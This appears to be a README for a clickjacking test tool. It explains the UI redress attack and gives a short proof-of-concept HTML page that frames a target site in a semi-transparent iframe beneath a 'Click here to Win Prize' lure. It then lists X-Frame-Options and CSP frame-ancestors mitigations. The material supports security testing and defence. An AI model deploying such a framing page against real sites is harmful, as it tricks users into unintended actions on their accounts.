# ClickjackingTester

Clickjacking is a portmanteau of two words ‘click’ and ‘hijacking’. It refers to hijacking user’s click for malicious intent. In it, an attacker embeds the vulnerable site in an transparent iframe in attacker’s own website and overlays it with objects such as button using CSS skills. This tricks users to perform unintended actions on vulnerable website, thinking they are doing those on attacker’s website. Clickjacking, also known as a "UI redress attack".

## DESCRIPTION

Users are tricked into performing all sorts of unintended actions are such as typing in the password, clicking on ‘Delete my account’ button, liking a post, deleting a post, commenting on a blog. In other words all the actions that a normal user can do on a legitimate website can be done using clickjacking.

## PoC

1. Copy and paste the below HTML code.
<!DOCTYPE html>
<html>
<head>
<title>Clickjacking PoC</title>
</head>
<body>
<input type=button value="Click here to Win Prize" style="z-index:-1;left:1200px;position:relative;top:800px;"/>
<iframe src="http://test.com/" width=100% height=100% style=”opacity: 0.5;”></iframe>
</body>
</html>
2. Edite the src attribute of iframe tag. Change its url to your target site and save the file.
3. Launch the file in browser.
4. Observe that the website is getting embeded in an Iframe.

## Mitigation

In order to fix the issue, we must know the underlying reason that is causing the issue. Clickjacking is caused due to allowing permission to a third party website to embed the vulnerabe site using Iframe. Disallowing this can be done by setting HTTP headers that direct browser to not allow the target website to be iframed. This can be done by configuring server on the following two response headers: X-Frame-Options Content-Security-Policy. Implement anyone of the below basaed on your business requirements:
1. Content-Security-Policy: frame-ancestors ‘none’ : Set this if you want to disallow every domain from embedding your site in an Iframe.
2. Content-Security-Policy: frame-ancestors ‘self’ : Set this if you want to disallow every domain from embedding your site in an Iframe and allow only your domain (i.e. the site itself) to embed itself in Iframe.
3. Content-Security-Policy: frame-ancestors uri : Set this if you want to allow a specifc uri to embed your site in an Iframe and disallow all the others.
